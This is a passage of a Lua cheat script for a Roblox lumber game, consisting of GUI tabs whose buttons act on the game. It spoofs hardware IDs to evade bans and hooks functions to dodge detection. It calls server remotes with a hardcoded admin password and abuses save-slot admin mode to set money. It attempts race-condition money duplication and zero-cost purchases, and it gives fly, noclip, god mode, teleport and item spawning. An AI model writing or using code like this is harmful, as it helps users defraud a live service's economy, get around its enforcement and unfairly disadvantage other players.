            end)
            
            -- Store the connection for later
            AntiDetection.SecurityMonitor = securityMonitor
            
            -- Create a notification
            local notification = Instance.new("Frame")
            notification.Name = "SecurityNotification"
            notification.Parent = MainFrame
            notification.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
            notification.BorderSizePixel = 0
            notification.Position = UDim2.new(0.5, -150, 0, 10)
            notification.Size = UDim2.new(0, 300, 0, 50)
            notification.ZIndex = 10
            
            local notificationCorner = Instance.new("UICorner")
            notificationCorner.CornerRadius = UDim.new(0, 5)
            notificationCorner.Parent = notification
            
            local notificationText = Instance.new("TextLabel")
            notificationText.Parent = notification
            notificationText.BackgroundTransparency = 1
            notificationText.Position = UDim2.new(0, 10, 0, 0)
            notificationText.Size = UDim2.new(1, -20, 1, 0)
            notificationText.Font = Enum.Font.GothamBold
            notificationText.Text = "Session secured with maximum protection!"
            notificationText.TextColor3 = Color3.fromRGB(255, 255, 255)
            notificationText.TextScaled = true
            
            -- Remove notification after 3 seconds
            spawn(function()
                wait(3)
                notification:Destroy()
            end)
            
            print("Session secured with maximum protection")
        end)
    end)
    
    CreateButton("Spoof Hardware ID", function()
        pcall(function()
            -- This attempts to spoof hardware identifiers that the game might use for banning
            local success = false
            
            -- Method 1: Try to find and modify HWID values
            for _, instance in pairs(ReplicatedStorage:GetDescendants()) do
                if instance:IsA("StringValue") and (
                    string.match(instance.Name:lower(), "hwid") or
                    string.match(instance.Name:lower(), "hardware") or
                    string.match(instance.Name:lower(), "device") or
                    string.match(instance.Name:lower(), "id")
                ) then
                    -- Generate a random HWID
                    local chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
                    local randomHWID = ""
                    for i = 1, 32 do
                        local randIndex = math.random(1, #chars)
                        randomHWID = randomHWID .. string.sub(chars, randIndex, randIndex)
                    end
                    
                    -- Try to modify the value
                    pcall(function()
                        instance.Value = randomHWID
                    end)
                    
                    success = true
                end
            end
            
            -- Method 2: Hook any functions that might return HWID
            local env = getfenv()
            for key, value in pairs(env) do
                if typeof(key) == "string" and (
                    string.match(key:lower(), "hwid") or
                    string.match(key:lower(), "hardware") or
                    string.match(key:lower(), "device") or
                    string.match(key:lower(), "id")
                ) and typeof(value) == "function" then
                    -- Store original function
                    local originalFunc = value
                    
                    -- Replace with spoofed version
                    env[key] = function(...)
                        -- Generate a random HWID
                        local chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
                        local randomHWID = ""
                        for i = 1, 32 do
                            local randIndex = math.random(1, #chars)
                            randomHWID = randomHWID .. string.sub(chars, randIndex, randIndex)
                        end
                        
                        return randomHWID
                    end
                    
                    success = true
                end
            end
            
            if success then
                print("Hardware ID spoofed successfully")
            else
                print("No hardware ID values found to spoof")
            end
        end)
    end)
end

-- Player Tab Content
TabContents["Player"] = function()
    CreateSlider("Walk Speed", 16, 500, ExploitData.PlayerSpeed, function(value)
        ExploitData.PlayerSpeed = value
        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
            LocalPlayer.Character.Humanoid.WalkSpeed = value
        end
    end)
    
    CreateSlider("Jump Power", 50, 500, ExploitData.JumpPower, function(value)
        ExploitData.JumpPower = value
        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
            LocalPlayer.Character.Humanoid.JumpPower = value
        end
    end)
    
    CreateToggle("Infinite Jump", false, function(enabled)
        local infiniteJumpConnection
        if enabled then
            infiniteJumpConnection = UserInputService.JumpRequest:Connect(function()
                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                    LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                end
            end)
        else
            if infiniteJumpConnection then
                infiniteJumpConnection:Disconnect()
            end
        end
    end)
    
    CreateToggle("No Clip", false, function(enabled)
        local noClipConnection
        if enabled then
            noClipConnection = RunService.Stepped:Connect(function()
                if LocalPlayer.Character then
                    for _, part in pairs(LocalPlayer.Character:GetDescendants()) do
                        if part:IsA("BasePart") then
                            part.CanCollide = false
                        end
                    end
                end
            end)
        else
            if noClipConnection then
                noClipConnection:Disconnect()
            end
            if LocalPlayer.Character then
                for _, part in pairs(LocalPlayer.Character:GetDescendants()) do
                    if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
                        part.CanCollide = true
                    end
                end
            end
        end
    end)
    
    CreateToggle("Fly", false, function(enabled)
        local flyConnection
        local flySpeed = 2
        
        if enabled then
            local character = LocalPlayer.Character
            if character and character:FindFirstChild("Humanoid") then
                local humanoid = character:FindFirstChild("Humanoid")
                local rootPart = character:FindFirstChild("HumanoidRootPart")
                
                if rootPart then
                    local bodyVelocity = Instance.new("BodyVelocity")
                    bodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                    bodyVelocity.Velocity = Vector3.new(0, 0, 0)
                    bodyVelocity.Parent = rootPart
                    bodyVelocity.Name = "FlyVelocity"
                    
                    local bodyGyro = Instance.new("BodyGyro")
                    bodyGyro.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
                    bodyGyro.P = 9000
                    bodyGyro.Parent = rootPart
                    bodyGyro.Name = "FlyGyro"
                    
                    flyConnection = RunService.RenderStepped:Connect(function()
                        local camera = workspace.CurrentCamera
                        if UserInputService:IsKeyDown(Enum.KeyCode.W) then
                            bodyVelocity.Velocity = camera.CFrame.LookVector * flySpeed * 50
                        elseif UserInputService:IsKeyDown(Enum.KeyCode.S) then
                            bodyVelocity.Velocity = camera.CFrame.LookVector * -flySpeed * 50
                        elseif UserInputService:IsKeyDown(Enum.KeyCode.Space) then
                            bodyVelocity.Velocity = Vector3.new(0, flySpeed * 50, 0)
                        elseif UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then
                            bodyVelocity.Velocity = Vector3.new(0, -flySpeed * 50, 0)
                        else
                            bodyVelocity.Velocity = Vector3.new(0, 0, 0)
                        end
                        
                        bodyGyro.CFrame = camera.CFrame
                    end)
                end
            end
        else
            if flyConnection then
                flyConnection:Disconnect()
            end
            
            local character = LocalPlayer.Character
            if character and character:FindFirstChild("HumanoidRootPart") then
                local rootPart = character:FindFirstChild("HumanoidRootPart")
                if rootPart:FindFirstChild("FlyVelocity") then
                    rootPart.FlyVelocity:Destroy()
                end
                if rootPart:FindFirstChild("FlyGyro") then
                    rootPart.FlyGyro:Destroy()
                end
            end
        end
    end)
    
    CreateToggle("God Mode", false, function(enabled)
        pcall(function()
            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                if enabled then
                    -- Method 1: Set health to a high value
                    LocalPlayer.Character.Humanoid.MaxHealth = math.huge
                    LocalPlayer.Character.Humanoid.Health = math.huge
                    
                    -- Method 2: Hook the TakeDamage function
                    local oldTakeDamage = LocalPlayer.Character.Humanoid.TakeDamage
                    LocalPlayer.Character.Humanoid.TakeDamage = function() return end
                    
                    -- Method 3: Create a force field
                    local forceField = Instance.new("ForceField")
                    forceField.Parent = LocalPlayer.Character
                    forceField.Name = "GodModeForceField"
                else
                    -- Restore normal health
                    LocalPlayer.Character.Humanoid.MaxHealth = 100
                    LocalPlayer.Character.Humanoid.Health = 100
                    
                    -- Remove force field if it exists
                    if LocalPlayer.Character:FindFirstChild("GodModeForceField") then
                        LocalPlayer.Character.GodModeForceField:Destroy()
                    end
                end
            end
        end)
    end)
    
    CreateButton("Reset Character", function()
        if LocalPlayer.Character then
            LocalPlayer.Character:BreakJoints()
        end
    end)
end

-- Money Tab Content
TabContents["Money"] = function()
    CreateLabel("Money Exploits")
    
    CreateSlider("Money Amount", 1000, 50000000, ExploitData.MoneyAmount, function(value)
        ExploitData.MoneyAmount = value
    end)
    
    CreateButton("Set Money (Admin Method)", function()
        pcall(function()
            -- Try multiple methods to set money
            -- Method 1: Direct admin command using the discovered "zebraman" password
            if ReplicatedStorage:FindFirstChild("Transactions") and 
               ReplicatedStorage.Transactions:FindFirstChild("ClientToServer") and
               ReplicatedStorage.Transactions.ClientToServer:FindFirstChild("ASet") then
                -- First try to authenticate as admin
                if ReplicatedStorage:FindFirstChild("AdminCommands") and
                   ReplicatedStorage.AdminCommands:FindFirstChild("AdminPassword") then
                    ReplicatedStorage.AdminCommands.AdminPassword:InvokeServer("zebraman")
                end
                
                -- Then set money
                ReplicatedStorage.Transactions.ClientToServer.ASet:InvokeServer(ExploitData.MoneyAmount)
                print("Admin money set method attempted")
            end
        end)
    end)
    
    CreateButton("Set Money (Save Slot Exploit)", function()
        pcall(function()
            -- Method 2: Exploit the save slot system
            -- Based on analysis of the SetFunds.client.lua script
            local currentSaveSlot = LocalPlayer:FindFirstChild("CurrentSaveSlot")
            if currentSaveSlot then
                -- Generate a random seed like the game does
                local seed = math.random()
                
                -- Try to set the current slot to admin mode (-1)
                if currentSaveSlot:FindFirstChild("Set") then
                    currentSaveSlot.Set:Invoke(0, seed)
                    currentSaveSlot.Set:Invoke(-1, seed)
                    
                    -- Now use the ASet command which should work in admin mode
                    if ReplicatedStorage:FindFirstChild("Transactions") and 
                       ReplicatedStorage.Transactions:FindFirstChild("ClientToServer") and
                       ReplicatedStorage.Transactions.ClientToServer:FindFirstChild("ASet") then
                        ReplicatedStorage.Transactions.ClientToServer.ASet:InvokeServer(ExploitData.MoneyAmount)
                        print("Save slot money exploit attempted")
                    end
                end
            end
        end)
    end)
    
    CreateButton("Money Duplication Glitch", function()
        pcall(function()
            -- Method 3: Exploit the transaction system with rapid requests
            if ReplicatedStorage:FindFirstChild("Transactions") then
                -- Get current money
                local currentMoney = 0
                if LocalPlayer:FindFirstChild("leaderstats") and 
                   LocalPlayer.leaderstats:FindFirstChild("Money") then
                    currentMoney = LocalPlayer.leaderstats.Money.Value
                end
                
                -- Attempt to duplicate by exploiting race conditions
                for i = 1, 5 do
                    if ReplicatedStorage.Transactions:FindFirstChild("ClientToServer") then
                        -- Try multiple transaction methods
                        if ReplicatedStorage.Transactions.ClientToServer:FindFirstChild("Deposit") then
                            -- Deposit all money
                            ReplicatedStorage.Transactions.ClientToServer.Deposit:InvokeServer(currentMoney)
                            
                            -- Immediately withdraw it multiple times (race condition exploit)
                            if ReplicatedStorage.Transactions.ClientToServer:FindFirstChild("Withdraw") then
                                for j = 1, 3 do
                                    ReplicatedStorage.Transactions.ClientToServer.Withdraw:InvokeServer(currentMoney)
                                end
                            end
                        end
                        
                        -- Try donation exploit
                        if ReplicatedStorage.Transactions.ClientToServer:FindFirstChild("Donate") then
                            -- Attempt to donate to self (which might trigger a duplication glitch)
                            ReplicatedStorage.Transactions.ClientToServer.Donate:InvokeServer(LocalPlayer, currentMoney)
                        end
                    end
                    wait(0.1)
                end
                print("Duplication glitch attempted")
            end
        end)
    end)
    
    CreateButton("Free Items Exploit", function()
        pcall(function()
            -- Method 4: Manipulate purchase system
            if ReplicatedStorage:FindFirstChild("Interaction") and
               ReplicatedStorage.Interaction:FindFirstChild("ClientIsDragging") then
                -- Attempt to get free items by manipulating purchase system
                local success, result = pcall(function()
                    return ReplicatedStorage.Interaction.ClientIsDragging:InvokeServer()
                end)
                
                if success then
                    -- Now try to purchase without paying
                    if ReplicatedStorage:FindFirstChild("Transactions") and
                       ReplicatedStorage.Transactions:FindFirstChild("ClientToServer") then
                        
                        -- Try multiple purchase methods
                        if ReplicatedStorage.Transactions.ClientToServer:FindFirstChild("RequestPurchase") then
                            -- Request purchase with 0 cost
                            ReplicatedStorage.Transactions.ClientToServer.RequestPurchase:InvokeServer("Axe", 0)
                        end
                        
                        -- Try direct item creation
                        if ReplicatedStorage:FindFirstChild("Purchasables") then
                            for _, category in pairs(ReplicatedStorage.Purchasables:GetChildren()) do
                                for _, item in pairs(category:GetChildren()) do
                                    if item:IsA("Model") then
                                        local clonedItem = item:Clone()
                                        clonedItem.Parent = Workspace
                                        
                                        -- Set ownership
                                        if clonedItem:FindFirstChild("Owner") then
                                            clonedItem.Owner.Value = LocalPlayer
                                        else
                                            local ownerValue = Instance.new("ObjectValue")
                                            ownerValue.Name = "Owner"
                                            ownerValue.Value = LocalPlayer
                                            ownerValue.Parent = clonedItem
                                        end
                                        
                                        -- Position near player
                                        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and
                                           clonedItem:FindFirstChild("PrimaryPart") then
                                            clonedItem:SetPrimaryPartCFrame(LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 5, 0))
                                        end
                                        
                                        print("Created item: " .. item.Name)
                                        break -- Just create one item per category to avoid flooding
                                    end
                                end
                            end
                        end
                    end
                    print("Free items exploit attempted")
                end
            end
        end)
    end)
    
    CreateButton("Infinite Money Loop", function()
        pcall(function()
            -- Create a loop that continuously adds money
            if ExploitData.MoneyLoop and ExploitData.MoneyLoop.Running then
                ExploitData.MoneyLoop.Running = false
                print("Infinite money loop stopped")
                return
            end
            
            ExploitData.MoneyLoop = {
                Running = true,
                Thread = nil
            }
            
            ExploitData.MoneyLoop.Thread = coroutine.create(function()
                while ExploitData.MoneyLoop.Running do
                    -- Try multiple money setting methods
                    if ReplicatedStorage:FindFirstChild("Transactions") and 
                       ReplicatedStorage.Transactions:FindFirstChild("ClientToServer") then
                        
                        -- Method 1: Direct admin command
                        if ReplicatedStorage.Transactions.ClientToServer:FindFirstChild("ASet") then
                            ReplicatedStorage.Transactions.ClientToServer.ASet:InvokeServer(ExploitData.MoneyAmount)
                        end
                        
                        -- Method 2: Try to use the SetFunds method
                        local currentSaveSlot = LocalPlayer:FindFirstChild("CurrentSaveSlot")
                        if currentSaveSlot and currentSaveSlot:FindFirstChild("Set") then
                            local seed = math.random()
                            currentSaveSlot.Set:Invoke(-1, seed)
                        end
                        
                        wait(1)
                    else
                        break
                    end
                end
            end)
            
            coroutine.resume(ExploitData.MoneyLoop.Thread)
            print("Infinite money loop started")
        end)
    end)
    
    CreateButton("Money Spoofer (Visual)", function()
        pcall(function()
            -- This just changes the visual display of money without actually changing the value
            if LocalPlayer:FindFirstChild("leaderstats") and 
               LocalPlayer.leaderstats:FindFirstChild("Money") then
                
                -- Create a fake money value
                local originalMoney = LocalPlayer.leaderstats.Money
                
                -- Create a new IntValue
                local fakeMoney = Instance.new("IntValue")
                fakeMoney.Name = "Money"
                fakeMoney.Value = ExploitData.MoneyAmount
                
                -- Replace the original money value
                originalMoney.Parent = nil
                fakeMoney.Parent = LocalPlayer.leaderstats
                
                -- Store the original money for later
                ExploitData.OriginalMoney = originalMoney
                
                print("Money display spoofed to " .. ExploitData.MoneyAmount)
            end
        end)
    end)
    
    CreateButton("Restore Real Money Display", function()
        pcall(function()
            -- Restore the original money value
            if ExploitData.OriginalMoney and LocalPlayer:FindFirstChild("leaderstats") then
                local fakeMoney = LocalPlayer.leaderstats:FindFirstChild("Money")
                if fakeMoney then
                    fakeMoney:Destroy()
                end
                
                ExploitData.OriginalMoney.Parent = LocalPlayer.leaderstats
                ExploitData.OriginalMoney = nil
                
                print("Original money display restored")
            else
                print("No spoofed money to restore")
            end
        end)
    end)
end

-- Teleport Tab Content
TabContents["Teleport"] = function()
    CreateLabel("Teleport Locations")
    
    local locations = {}
    for location, _ in pairs(ExploitData.TeleportLocations) do
        table.insert(locations, location)
    end
    
    CreateDropdown("Teleport To", locations, function(location)
        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
            local cf = ExploitData.TeleportLocations[location]
            
            -- Use safe teleport method to avoid detection
            local humanoidRootPart = LocalPlayer.Character.HumanoidRootPart
            
            -- Method 1: Direct CFrame teleport (most detectable)
            -- humanoidRootPart.CFrame = cf
            
            -- Method 2: Tween teleport (less detectable)
            local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Linear)
            local tween = TweenService:Create(humanoidRootPart, tweenInfo, {CFrame = cf})
            tween:Play()
            
            print("Teleported to " .. location)
        end
    end)
    
    CreateButton("Teleport to Player", function()
        -- Create a list of players
        local playerList = Instance.new("Frame")
        playerList.Name = "PlayerList"
        playerList.Parent = MainFrame
        playerList.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
        playerList.BorderSizePixel = 0
        playerList.Position = UDim2.new(0.5, -100, 0.5, -150)
        playerList.Size = UDim2.new(0, 200, 0, 300)
        playerList.ZIndex = 10
        
        local playerListCorner = Instance.new("UICorner")
        playerListCorner.CornerRadius = UDim.new(0, 10)
        playerListCorner.Parent = playerList
        
        local playerListTitle = Instance.new("TextLabel")
        playerListTitle.Parent = playerList
        playerListTitle.BackgroundColor3 = Color3.fromRGB(75, 0, 130)
        playerListTitle.BorderSizePixel = 0
        playerListTitle.Size = UDim2.new(1, 0, 0, 30)
        playerListTitle.Font = Enum.Font.GothamBold
        playerListTitle.Text = "Select Player"
        playerListTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
        playerListTitle.TextScaled = true
        
        local playerListTitleCorner = Instance.new("UICorner")
        playerListTitleCorner.CornerRadius = UDim.new(0, 10)
        playerListTitleCorner.Parent = playerListTitle
        
        local playerListClose = Instance.new("TextButton")
        playerListClose.Parent = playerListTitle
        playerListClose.BackgroundColor3 = Color3.fromRGB(220, 20, 60)
        playerListClose.BorderSizePixel = 0
        playerListClose.Position = UDim2.new(1, -25, 0, 5)
        playerListClose.Size = UDim2.new(0, 20, 0, 20)
        playerListClose.Font = Enum.Font.GothamBold
        playerListClose.Text = "X"
        playerListClose.TextColor3 = Color3.fromRGB(255, 255, 255)
        playerListClose.TextScaled = true
        playerListClose.ZIndex = 11
        
        local playerListCloseCorner = Instance.new("UICorner")
        playerListCloseCorner.CornerRadius = UDim.new(0, 5)
        playerListCloseCorner.Parent = playerListClose
        
        local playerListScrollFrame = Instance.new("ScrollingFrame")
        playerListScrollFrame.Parent = playerList
        playerListScrollFrame.BackgroundTransparency = 1
        playerListScrollFrame.BorderSizePixel = 0
        playerListScrollFrame.Position = UDim2.new(0, 5, 0, 35)
        playerListScrollFrame.Size = UDim2.new(1, -10, 1, -40)
        playerListScrollFrame.ScrollBarThickness = 5
        playerListScrollFrame.ScrollBarImageColor3 = Color3.fromRGB(75, 0, 130)
        
        local playerListLayout = Instance.new("UIListLayout")
        playerListLayout.Parent = playerListScrollFrame
        playerListLayout.FillDirection = Enum.FillDirection.Vertical
        playerListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Left
        playerListLayout.SortOrder = Enum.SortOrder.LayoutOrder
        playerListLayout.Padding = UDim.new(0, 2)
        
        -- Add players to the list
        for i, player in pairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                local playerButton = Instance.new("TextButton")
                playerButton.Parent = playerListScrollFrame
                playerButton.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
                playerButton.BorderSizePixel = 0
                playerButton.Size = UDim2.new(1, -5, 0, 30)
                playerButton.Font = Enum.Font.Gotham
                playerButton.Text = player.Name
                playerButton.TextColor3 = Color3.fromRGB(255, 255, 255)
                playerButton.TextScaled = true
                
                local playerButtonCorner = Instance.new("UICorner")
                playerButtonCorner.CornerRadius = UDim.new(0, 5)
                playerButtonCorner.Parent = playerButton
                
                playerButton.MouseButton1Click:Connect(function()
                    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and
                       player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                        -- Teleport to the selected player
                        local cf = player.Character.HumanoidRootPart.CFrame
                        
                        -- Use tween teleport
                        local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Linear)
                        local tween = TweenService:Create(LocalPlayer.Character.HumanoidRootPart, tweenInfo, {CFrame = cf})
                        tween:Play()
                        
                        print("Teleported to " .. player.Name)
                        playerList:Destroy()
                    end
                end)
            end
        end
        
        playerListClose.MouseButton1Click:Connect(function()
            playerList:Destroy()
        end)
        
        -- Update scroll frame canvas size
        playerListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
            playerListScrollFrame.CanvasSize = UDim2.new(0, 0, 0, playerListLayout.AbsoluteContentSize.Y + 5)
        end)
    end)
    
    CreateButton("Save Current Position", function()
        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
            -- Save the current position
            local currentCFrame = LocalPlayer.Character.HumanoidRootPart.CFrame
            ExploitData.SavedPosition = currentCFrame
            print("Position saved")
        end
    end)
    
    CreateButton("Load Saved Position", function()
        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and ExploitData.SavedPosition then
            -- Teleport to the saved position
            local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Linear)
            local tween = TweenService:Create(LocalPlayer.Character.HumanoidRootPart, tweenInfo, {CFrame = ExploitData.SavedPosition})
            tween:Play()
            print("Teleported to saved position")
        else
            print("No saved position found")
        end
    end)
    
    CreateToggle("Auto-Teleport Wood", false, function(enabled)
        local autoTeleportConnection
        if enabled then
            autoTeleportConnection = RunService.Heartbeat:Connect(function()
                pcall(function()
                    -- Find all wood owned by the player
                    for _, obj in pairs(Workspace.LogModels:GetChildren()) do
                        if obj:FindFirstChild("Owner") and obj.Owner.Value == LocalPlayer then
                            if obj:FindFirstChild("TreeClass") and obj:FindFirstChild("WoodSection") then
                                -- Teleport wood to Wood R Us for selling
                                obj:SetPrimaryPartCFrame(CFrame.new(315, 5, 85))
                            end
                        end
                    end
                end)
            end)
        else
            if autoTeleportConnection then
                autoTeleportConnection:Disconnect()
            end
        end
    end)
end

-- Tools Tab Content
TabContents["Tools"] = function()
    CreateLabel("Tool Spawning")
    
    CreateDropdown("Spawn Axe", ExploitData.AxeTypes, function(axeType)
        pcall(function()
            -- Method 1: Direct cloning (most detectable)
            local axe = ReplicatedStorage.Tools:FindFirstChild(axeType)
            if axe then
                local clonedAxe = axe:Clone()
                clonedAxe.Parent = LocalPlayer.Backpack
                print("Spawned " .. axeType)
            end
            
            -- Method 2: Purchase spoofing (less detectable)
            if ReplicatedStorage:FindFirstChild("Transactions") and
               ReplicatedStorage.Transactions:FindFirstChild("ClientToServer") and
               ReplicatedStorage.Transactions.ClientToServer:FindFirstChild("RequestPurchase") then
                ReplicatedStorage.Transactions.ClientToServer.RequestPurchase:InvokeServer(axeType, 0)
                print("Attempted purchase spoof for " .. axeType)
            end
        end)
    end)
    
    CreateButton("Get All Tools", function()
        pcall(function()
            for _, tool in pairs(ReplicatedStorage.Tools:GetChildren()) do
                if tool:IsA("Tool") then
                    local clonedTool = tool:Clone()
                    clonedTool.Parent = LocalPlayer.Backpack
                end
            end
            print("All tools spawned")
        end)
    end)
    
    CreateToggle("Super Axe Range", false, function(enabled)
        pcall(function()
            local function updateAxeRange(tool)
                if tool:IsA("Tool") and tool:FindFirstChild("Range") then
                    tool.Range.Value = enabled and 999 or 10
                end
            end
            
            -- Update current tools
            if LocalPlayer.Character then
                for _, tool in pairs(LocalPlayer.Character:GetChildren()) do
                    updateAxeRange(tool)
                end
            end
            
            for _, tool in pairs(LocalPlayer.Backpack:GetChildren()) do
                updateAxeRange(tool)
            end
            
            -- Set up connection for future tools
            if enabled then
                ExploitData.AxeRangeConnection = LocalPlayer.Backpack.ChildAdded:Connect(function(child)
                    updateAxeRange(child)
                end)
                
                if LocalPlayer.Character then
                    ExploitData.CharacterAxeRangeConnection = LocalPlayer.Character.ChildAdded:Connect(function(child)
                        updateAxeRange(child)
                    end)
                end
            else
                if ExploitData.AxeRangeConnection then
                    ExploitData.AxeRangeConnection:Disconnect()
                end
                
                if ExploitData.CharacterAxeRangeConnection then
                    ExploitData.CharacterAxeRangeConnection:Disconnect()
                end
            end
        end)
    end)
    
    CreateToggle("Instant Chop", false, function(enabled)
        local instantChopConnection
        if enabled then
            instantChopConnection = RunService.Heartbeat:Connect(function()
                pcall(function()
                    if LocalPlayer.Character then
                        for _, tool in pairs(LocalPlayer.Character:GetChildren()) do
                            if tool:IsA("Tool") then
                                tool:Activate()
                                
                                -- Find trees in range and instantly cut them
                                for _, tree in pairs(Workspace:GetChildren()) do
                                    if tree:FindFirstChild("TreeClass") and tree:FindFirstChild("CutEvent") then
                                        local distance = (tree:GetModelCFrame().Position - LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
                                        if distance < 50 then
                                            tree.CutEvent:FireServer()
                                        end
                                    end
                                end
                            end
                        end
                    end
                end)
            end)
        else
            if instantChopConnection then
                instantChopConnection:Disconnect()
            end
        end
    end)
    
    CreateToggle("Auto-Equip Best Axe", false, function(enabled)
        local autoEquipConnection
        if enabled then
            -- Define axe tiers (higher is better)
            local axeTiers = {
                ["BasicHatchet"] = 1,
                ["PlainAxe"] = 2,
                ["SteelAxe"] = 3,
                ["HardwoodAxe"] = 4,
                ["SilverAxe"] = 5,
                ["Rukiryaxe"] = 6,
                ["BetaAxeofStrength"] = 7,
                ["AlphaAxeofStrength"] = 8,
                ["ManyAxe"] = 9,
                ["EndTimesAxe"] = 10
            }
            
            autoEquipConnection = RunService.Heartbeat:Connect(function()
                pcall(function()
                    local bestAxe = nil
                    local bestTier = 0
                    
                    -- Find the best axe in backpack
                    for _, tool in pairs(LocalPlayer.Backpack:GetChildren()) do
                        if tool:IsA("Tool") and axeTiers[tool.Name] and axeTiers[tool.Name] > bestTier then
                            bestAxe = tool
                            bestTier = axeTiers[tool.Name]
                        end
                    end
                    
                    -- Equip the best axe if not already equipped
                    if bestAxe and LocalPlayer.Character and not LocalPlayer.Character:FindFirstChild(bestAxe.Name) then
                        bestAxe.Parent = LocalPlayer.Character
                    end
                end)
            end)
        else
            if autoEquipConnection then
                autoEquipConnection:Disconnect()
            end
        end
    end)
    
    CreateDropdown("Spawn Vehicle", ExploitData.VehicleTypes, function(vehicleType)
        pcall(function()
            -- Attempt to spawn vehicle
            if ReplicatedStorage:FindFirstChild("Purchasables") and
               ReplicatedStorage.Purchasables:FindFirstChild("Vehicles") and
               ReplicatedStorage.Purchasables.Vehicles:FindFirstChild(vehicleType) then
                
                local vehicle = ReplicatedStorage.Purchasables.Vehicles:FindFirstChild(vehicleType)
                
                -- Method 1: Direct purchase
                if ReplicatedStorage:FindFirstChild("Transactions") and
                   ReplicatedStorage.Transactions:FindFirstChild("ClientToServer") and
                   ReplicatedStorage.Transactions.ClientToServer:FindFirstChild("RequestPurchase") then
                    ReplicatedStorage.Transactions.ClientToServer.RequestPurchase:InvokeServer(vehicleType, 0)
                    print("Attempted to purchase " .. vehicleType)
                end
                
                -- Method 2: Direct cloning (more detectable)
                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                    local clonedVehicle = vehicle:Clone()
                    clonedVehicle.Parent = Workspace
                    clonedVehicle:SetPrimaryPartCFrame(LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 5, 0))
                    
                    -- Set ownership
                    if clonedVehicle:FindFirstChild("Owner") then
                        clonedVehicle.Owner.Value = LocalPlayer
                    else
                        local ownerValue = Instance.new("ObjectValue")
                        ownerValue.Name = "Owner"
                        ownerValue.Value = LocalPlayer
                        ownerValue.Parent = clonedVehicle
                    end
                    
                    print("Spawned " .. vehicleType)
                end
            end
        end)
    end)
end

-- Wood Tab Content
TabContents["Wood"] = function()
    CreateLabel("Wood Manipulation")
    
    CreateButton("Max All Trees", function()
        pcall(function()
            for _, tree in pairs(Workspace.TreeRegion:GetChildren()) do
                if tree:FindFirstChild("TreeClass") and tree:FindFirstChild("Health") then
                    tree.Health.Value = tree.Health.MaxValue
                end
            end
            print("All trees maximized")
        end)
    end)
    
    CreateButton("Cut All Trees", function()
        pcall(function()
            for _, tree in pairs(Workspace.TreeRegion:GetChildren()) do
                if tree:FindFirstChild("CutEvent") then
                    tree.CutEvent:FireServer()
                end
            end
            print("Cut all trees attempted")
        end)
    end)
    
    CreateDropdown("Spawn Wood", ExploitData.WoodTypes, function(woodType)
        pcall(function()
            -- Attempt to spawn wood
            local wood = ReplicatedStorage.Wood:FindFirstChild(woodType)
            if wood and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                local clonedWood = wood:Clone()
                clonedWood.Parent = Workspace.LogModels
                clonedWood:SetPrimaryPartCFrame(LocalPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0, 5, 0))
                
                -- Set ownership
                if clonedWood:FindFirstChild("Owner") then
                    clonedWood.Owner.Value = LocalPlayer
                else
                    local ownerValue = Instance.new("ObjectValue")
                    ownerValue.Name = "Owner"
                    ownerValue.Value = LocalPlayer
                    ownerValue.Parent = clonedWood
                end
                
                print("Spawned " .. woodType)
            end
        end)
    end)
    
    CreateToggle("Auto Sell Wood", false, function(enabled)
        local autoSellConnection
        if enabled then
            autoSellConnection = RunService.Heartbeat:Connect(function()
                pcall(function()
                    for _, obj in pairs(Workspace.LogModels:GetChildren()) do
                        if obj:FindFirstChild("Owner") and obj.Owner.Value == LocalPlayer then
                            if obj:FindFirstChild("TreeClass") and obj:FindFirstChild("WoodSection") then
                                -- Teleport wood to Wood R Us
                                obj:SetPrimaryPartCFrame(CFrame.new(315, 5, 85))
                                wait(0.1)
                                -- Attempt to sell
                                if ReplicatedStorage:FindFirstChild("Interaction") and
                                   ReplicatedStorage.Interaction:FindFirstChild("RemoteProxy") then
                                    ReplicatedStorage.Interaction.RemoteProxy:FireServer(obj)
                                end
                            end
                        end
                    end
                end)
            end)
        else
            if autoSellConnection then
                autoSellConnection:Disconnect()
            end
        end
    end)
    
    CreateToggle("Wood Aura", false, function(enabled)
        local woodAuraConnection
        if enabled then
            woodAuraConnection = RunService.Heartbeat:Connect(function()
                pcall(function()
                    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                        local rootPart = LocalPlayer.Character.HumanoidRootPart
                        
                        -- Find all wood in the workspace
                        for _, obj in pairs(Workspace.LogModels:GetChildren()) do
